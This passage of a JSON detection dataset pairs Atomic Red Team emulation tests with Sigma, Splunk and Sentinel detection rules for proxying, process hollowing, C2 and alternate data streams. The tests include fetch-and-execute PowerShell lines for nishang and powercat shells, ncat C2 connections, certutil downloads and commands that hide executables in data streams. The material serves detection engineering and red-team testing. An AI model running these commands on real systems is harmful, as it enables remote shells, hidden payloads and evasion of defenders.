"input_arguments": {"connectport": {"default": 1337, "type": "string", "description": "Specifies the IPv4 port, by port number or service name, to which to connect. If connectport is not specified, the default is the value of listenport on the local computer."}, "connectaddress": {"default": "127.0.0.1", "type": "string", "description": "Specifies the IPv4 address to which to connect. Acceptable values are IP address, computer NetBIOS name, or computer DNS name. If an address is not specified, the default is the local computer."}, "listenport": {"default": 1337, "type": "string", "description": "Specifies the IPv4 port, by port number or service name, on which to listen."}}, "executor": {"elevation_required": true, "command": "netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}", "name": "powershell", "cleanup_command": "netsh interface portproxy delete v4tov4 listenport=#{listenport}"}}], "attack_technique": "T1090"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1090", "Empire Module": "python/management/multi/socks", "Technique": "Connection Proxy", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/management/multi/socks\":  [\"T1090\"],"}}], "queries": [{"query": "title: Netsh\nid: cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c\ndescription: Allow Incoming Connections by Port or Application on Windows Firewall\nreferences:\n    - https://attack.mitre.org/software/S0246/ (Lazarus HARDRAIN)\n    - https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-RAT-and-Staging-Report.pdf\ndate: 2019/01/29\ntags:\n    - attack.lateral_movement\n    - attack.command_and_control\n    - attack.t1090 \nstatus: experimental\nauthor: Markus Neis\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*netsh firewall add*'\n    condition: selection\nfalsepositives:\n    - Legitimate administration\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Netsh\nid: cd5cfd80-aa5f-44c0-9c20-108c4ae12e3c\ndescription: Allow Incoming Connections by Port or Application on Windows Firewall\nreferences:\n    - https://attack.mitre.org/software/S0246/ (Lazarus HARDRAIN)\n    - https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-RAT-and-Staging-Report.pdf\ndate: 2019/01/29\ntags:\n    - attack.lateral_movement\n    - attack.command_and_control\n    - attack.t1090 \nstatus: experimental\nauthor: Markus Neis\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - '*netsh firewall add*'\n    condition: selection\nfalsepositives:\n    - Legitimate administration\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*netsh\\\\ firewall\\\\ add*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Netsh <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Netsh\",\\n    \"description\": \"Allow Incoming Connections by Port or Application on Windows Firewall\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.command_and_control\",\\n      \"attack.t1090\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*netsh\\\\\\\\ firewall\\\\\\\\ add*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*netsh\\\\\\\\ firewall\\\\\\\\ add*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Netsh\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(*netsh firewall add*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*netsh firewall add*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"*netsh firewall add*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*netsh firewall add.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Netsh Port Forwarding\nid: 322ed9ec-fcab-4f67-9a34-e7c6aef43614\ndescription: Detects netsh commands that configure a port forwarding\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html\ndate: 2019/01/29\ntags:\n    - attack.lateral_movement\n    - attack.command_and_control\n    - attack.t1090\nstatus: experimental\nauthor: Florian Roth\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - netsh interface portproxy add v4tov4 *\n    condition: selection\nfalsepositives:\n    - Legitimate administration\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Netsh Port Forwarding\nid: 322ed9ec-fcab-4f67-9a34-e7c6aef43614\ndescription: Detects netsh commands that configure a port forwarding\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html\ndate: 2019/01/29\ntags:\n    - attack.lateral_movement\n    - attack.command_and_control\n    - attack.t1090\nstatus: experimental\nauthor: Florian Roth\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - netsh interface portproxy add v4tov4 *\n    condition: selection\nfalsepositives:\n    - Legitimate administration\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(netsh\\\\ interface\\\\ portproxy\\\\ add\\\\ v4tov4\\\\ *)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Netsh-Port-Forwarding <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Netsh Port Forwarding\",\\n    \"description\": \"Detects netsh commands that configure a port forwarding\",\\n    \"tags\": [\\n      \"attack.lateral_movement\",\\n      \"attack.command_and_control\",\\n      \"attack.t1090\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(netsh\\\\\\\\ interface\\\\\\\\ portproxy\\\\\\\\ add\\\\\\\\ v4tov4\\\\\\\\ *)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(netsh\\\\\\\\ interface\\\\\\\\ portproxy\\\\\\\\ add\\\\\\\\ v4tov4\\\\\\\\ *)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Netsh Port Forwarding\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:(netsh interface portproxy add v4tov4 *)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"netsh interface portproxy add v4tov4 *\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"netsh interface portproxy add v4tov4 *\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*netsh interface portproxy add v4tov4 .*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: netsh port forwarding\ndescription: windows server 2016\ntags: T1090\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ netsh.exe' # new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ cmd.exe' # creator process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: \"netsh interface portproxy add v4tov4 *\" # process command line arguments\n\u00a0\u00a0\u00a0\u00a0condition: selection\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1093/T1093.yaml", "command": ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose\n", "name": null}, {"source": "atomics/T1093/T1093.yaml", "command": ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose\n", "name": null}, {"source": "atomics/T1093/T1093.yaml", "command": ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process explorer | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", "name": null}, {"source": "atomics/T1093/T1093.yaml", "command": ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process explorer | select -expand id\nStart-Hollow -Sponsor \"C:\\Windows\\System32\\calc.exe\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", "name": null}], "command_list": [". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose\n", ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose\n", ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process explorer | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process explorer | select -expand id\nStart-Hollow -Sponsor \"C:\\Windows\\System32\\calc.exe\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n"], "technique_id": "T1093", "parsed_datasets": [{"Atomic Red Team Test - Process Hollowing": {"display_name": "Process Hollowing", "atomic_tests": [{"description": "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n", "supported_platforms": ["windows"], "name": "Process Hollowing using PowerShell", "input_arguments": {"hollow_binary_path": {"default": "C:\\Windows\\System32\\cmd.exe", "type": "string", "description": "Path of the binary to hollow (executable that will run inside the sponsor)"}, "spawnto_process_name": {"default": "calc", "type": "string", "description": "Name of the process to spawn"}, "parent_process_name": {"default": "explorer", "type": "string", "description": "Name of the parent process"}, "sponsor_binary_path": {"default": "C:\\Windows\\System32\\calc.exe", "type": "string", "description": "Path of the sponsor binary (executable that will host the binary)"}}, "executor": {"elevation_required": false, "command": ". $PathToAtomicsFolder\\T1093\\src\\Start-Hollow.ps1\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose\n", "name": "powershell", "cleanup_command": "Stop-Process -Name \"#{spawnto_process_name}\""}}], "attack_technique": "T1093"}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_path contains \"smss.exe\"and process_parent_command_line !contains \"smss.exe\")or (process_path contains \"csrss.exe\"and (process_parent_command_line !contains \"smss.exe\"or process_parent_command_line !contains \"svchost.exe\"))or (process_path contains \"wininit.exe\"and process_parent_command_line !contains \"smss.exe\")or (process_path contains \"winlogon.exe\" and process_parent_command_line !contains \"smss.exe\")or (process_path contains \"lsass.exe\" and process_parent_command_line !contains \"wininit.exe\")or (process_path contains \"LogonUI.exe\"and (process_parent_command_line !contains \"winlogon.exe\" or process_parent_command_line !contains \"wininit.exe\"))or (process_path contains \"services.exe\" and process_parent_command_line !contains \"wininit.exe\")or (process_path contains \"spoolsv.exe\" and process_parent_command_line !contains \"services.exe\")or (process_path contains \"taskhost.exe\"and (process_parent_command_line !contains \"services.exe\" or process_parent_command_line !contains \"svchost.exe\"))or (process_path contains \"taskhostw.exe\"and (process_parent_command_line !contains \"services.exe\" or process_parent_command_line !contains \"svchost.exe\"))or (process_path contains \"userinit.exe\"and (process_parent_command_line !contains \"dwm.exe\" or process_parent_command_line !contains \"winlogon.exe\"))", "product": "Azure Sentinel", "name": "Process Holoowing"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1095/T1095.yaml", "command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress 127.0.0.1\n", "name": null}, {"source": "atomics/T1095/T1095.yaml", "command": "cmd /c $env:TEMP\\T1095\\nmap-7.80\\ncat.exe #{server_ip} #{server_port}\n", "name": null}, {"source": "atomics/T1095/T1095.yaml", "command": "cmd /c $env:TEMP\\T1095\\nmap-7.80\\ncat.exe 127.0.0.1 #{server_port}\n", "name": null}, {"source": "atomics/T1095/T1095.yaml", "command": "cmd /c #{ncat_exe} #{server_ip} #{server_port}\n", "name": null}, {"source": "atomics/T1095/T1095.yaml", "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c 127.0.0.1 -p #{server_port}\n", "name": null}], "command_list": ["IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress 127.0.0.1\n", "cmd /c $env:TEMP\\T1095\\nmap-7.80\\ncat.exe #{server_ip} #{server_port}\n", "cmd /c $env:TEMP\\T1095\\nmap-7.80\\ncat.exe 127.0.0.1 #{server_port}\n", "cmd /c #{ncat_exe} #{server_ip} #{server_port}\n", "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c 127.0.0.1 -p #{server_port}\n"], "technique_id": "T1095", "parsed_datasets": [{"Atomic Red Team Test - Standard Non-Application Layer Protocol": {"display_name": "Standard Non-Application Layer Protocol", "atomic_tests": [{"description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n", "supported_platforms": ["windows"], "name": "ICMP C2", "input_arguments": {"server_ip": {"default": "127.0.0.1", "type": "ip", "description": "The IP address of the listening server"}}, "executor": {"elevation_required": false, "command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}\n", "name": "powershell"}}, {"dependencies": [{"description": "ncat.exe must be available at specified location (#{ncat_exe})\n", "get_prereq_command": "New-Item -ItemType Directory -Force -Path #{ncat_path} | Out-Null\n$parentpath = Split-Path (Split-Path \"#{ncat_exe}\"); $zippath = \"$parentpath\\nmap.zip\"\nInvoke-WebRequest  \"https://nmap.org/dist/nmap-7.80-win32.zip\" -OutFile \"$zippath\"\n  Expand-Archive $zippath $parentpath -Force\n  $unzipPath = Join-Path $parentPath \"nmap-7.80\"\nif( $null -eq (Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | ?{$_.DisplayName -like \"Microsoft Visual C++*\"}) ) {\n  Start-Process (Join-Path $unzipPath \"vcredist_x86.exe\")\n}\n", "prereq_command": "if( Test-Path \"#{ncat_exe}\") {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Netcat C2", "executor": {"elevation_required": false, "command": "cmd /c #{ncat_exe} #{server_ip} #{server_port}\n", "name": "powershell"}, "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n", "input_arguments": {"ncat_exe": {"default": "$env:TEMP\\T1095\\nmap-7.80\\ncat.exe", "type": "path", "description": "The location of ncat.exe"}, "server_ip": {"default": "127.0.0.1", "type": "string", "description": "The IP address or domain name of the listening server"}, "server_port": {"default": 80, "type": "integer", "description": "The port for the C2 connection"}, "ncat_path": {"default": "$env:TEMP\\T1095", "type": "path", "description": "The folder path of ncat.exe"}}, "dependency_executor_name": "powerShell"}, {"description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n", "supported_platforms": ["windows"], "name": "Powercat C2", "input_arguments": {"server_ip": {"default": "127.0.0.1", "type": "ip", "description": "The IP address or domain name of the listening server"}, "server_port": {"default": 80, "type": "port number", "description": "The port for the C2 connection"}}, "executor": {"elevation_required": false, "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c #{server_ip} -p #{server_port}\n", "name": "powershell"}}], "attack_technique": "T1095"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1096/T1096.yaml", "command": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 c:\\ADS\\\\procexp.cab c:\\ADS\\\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump c:\\ADS\\\\procexp.exe > c:\\ADS\\\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 c:\\temp:ttt\nmakecab c:\\ADS\\\\autoruns.exe c:\\ADS\\\\cabtest.txt:autoruns.cab\nprint /D:c:\\ADS\\\\file.txt:autoruns.exe c:\\ADS\\\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ADS\\\\file.txt:evilreg.reg\nregedit /E c:\\ADS\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat c:\\ADS\\\\file.txt:file.bat\nesentutl.exe /y c:\\ADS\\\\autoruns.exe /d c:\\ADS\\\\file.txt:autoruns.exe /o\n", "name": null}, {"source": "atomics/T1096/T1096.yaml", "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,c:\\windows\\system32\\cmd.exe,>,`\"#{ads_file_path}:#{ads_name}`\"\"\n", "name": null}, {"source": "atomics/T1096/T1096.yaml", "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,c:\\windows\\system32\\cmd.exe,>,`\"#{ads_file_path}:desktop.ini`\"\"\n", "name": null}, {"source": "atomics/T1096/T1096.yaml", "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"C:\\Users\\Public\\Libraries\\yanki\\desktop.ini:#{ads_name}`\"\"\n", "name": null}], "command_list": ["type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 c:\\ADS\\\\procexp.cab c:\\ADS\\\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump c:\\ADS\\\\procexp.exe > c:\\ADS\\\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 c:\\temp:ttt\nmakecab c:\\ADS\\\\autoruns.exe c:\\ADS\\\\cabtest.txt:autoruns.cab\nprint /D:c:\\ADS\\\\file.txt:autoruns.exe c:\\ADS\\\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ADS\\\\file.txt:evilreg.reg\nregedit /E c:\\ADS\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat c:\\ADS\\\\file.txt:file.bat\nesentutl.exe /y c:\\ADS\\\\autoruns.exe /d c:\\ADS\\\\file.txt:autoruns.exe /o\n", "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,c:\\windows\\system32\\cmd.exe,>,`\"#{ads_file_path}:#{ads_name}`\"\"\n", "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,c:\\windows\\system32\\cmd.exe,>,`\"#{ads_file_path}:desktop.ini`\"\"\n", "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"C:\\Users\\Public\\Libraries\\yanki\\desktop.ini:#{ads_name}`\"\"\n"], "technique_id": "T1096", "parsed_datasets": [{"Atomic Red Team Test - NTFS File Attributes": {"display_name": "NTFS File Attributes", "atomic_tests": [{"description": "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n", "supported_platforms": ["windows"], "name": "Alternate Data Streams (ADS)", "input_arguments": {"path": {"default": "c:\\ADS\\", "type": "path", "description": "Path of ADS file"}}, "executor": {"elevation_required": true, "command": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 #{path}\\procexp.cab #{path}\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\procexp.exe > #{path}\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1096/src/test.ps1 c:\\temp:ttt\nmakecab #{path}\\autoruns.exe #{path}\\cabtest.txt:autoruns.cab\nprint /D:#{path}\\file.txt:autoruns.exe #{path}\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg #{path}\\file.txt:evilreg.reg\nregedit /E #{path}\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat #{path}\\file.txt:file.bat\nesentutl.exe /y #{path}\\autoruns.exe /d #{path}\\file.txt:autoruns.exe /o\n", "name": "command_prompt"}}, {"description": "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\n", "supported_platforms": ["windows"], "name": "Store file in Alternate Data Stream (ADS)", "input_arguments": {"payload_path": {"default": "c:\\windows\\system32\\cmd.exe", "type": "path", "description": "Path of file to hide in ADS"}, "ads_name": {"default": "desktop.ini", "type": "string", "description": "Name of ADS"}, "ads_file_path": {"default": "C:\\Users\\Public\\Libraries\\yanki\\desktop.ini", "type": "path", "description": "Path of file to create an ADS under"}}, "executor": {"prereq_command": "", "elevation_required": false, "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n    New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n    }\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"#{ads_file_path}:#{ads_name}`\"\"\n", "cleanup_command": "Remove-Item \"#{ads_file_path}\" -Force -ErrorAction Ignore", "name": "powershell"}}], "attack_technique": "T1096"}}], "queries": [{"query": "Sysmon| where EventID == 1 and process_path contains \"fsutil.exe\" and process_command_line contains \"*usn*deletejournal*\"", "product": "Azure Sentinel", "name": "NTFS File Attributes"}, {"query": "title: NTFS Alternate Data Stream\nid: 8c521530-5169-495d-a199-0a3a881ad24e\nstatus: experimental\ndescription: Detects writing data into NTFS alternate data streams from powershell. Needs Script Block Logging.\nreferences:\n    - http://www.powertheshell.com/ntfsstreams/\ntags:\n    - attack.defense_evasion\n    - attack.t1096\nauthor: Sami Ruohonen\nlogsource:\n    product: windows\n    service: powershell\n    definition: 'It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277'\ndetection:\n    keyword1:\n        - \"set-content\"\n    keyword2:\n        - \"-stream\"\n    condition: keyword1 and keyword2\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: NTFS Alternate Data Stream\nid: 8c521530-5169-495d-a199-0a3a881ad24e\nstatus: experimental\ndescription: Detects writing data into NTFS alternate data streams from powershell. Needs Script Block Logging.\nreferences:\n    - http://www.powertheshell.com/ntfsstreams/\ntags:\n    - attack.defense_evasion\n    - attack.t1096\nauthor: Sami Ruohonen\nlogsource:\n    product: windows\n    service: powershell\n    definition: 'It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277'\ndetection:\n    keyword1:\n        - \"set-content\"\n    keyword2:\n        - \"-stream\"\n    condition: keyword1 and keyword2\nfalsepositives:\n    - unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "\\\\*.keyword:(*set\\\\-content* AND *\\\\-stream*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/NTFS-Alternate-Data-Stream <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"NTFS Alternate Data Stream\",\\n    \"description\": \"Detects writing data into NTFS alternate data streams from powershell. Needs Script Block Logging.\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1096\"\\n    ],\\n    \"query\": \"\\\\\\\\*.keyword:(*set\\\\\\\\-content* AND *\\\\\\\\-stream*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"\\\\\\\\*.keyword:(*set\\\\\\\\-content* AND *\\\\\\\\-stream*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": 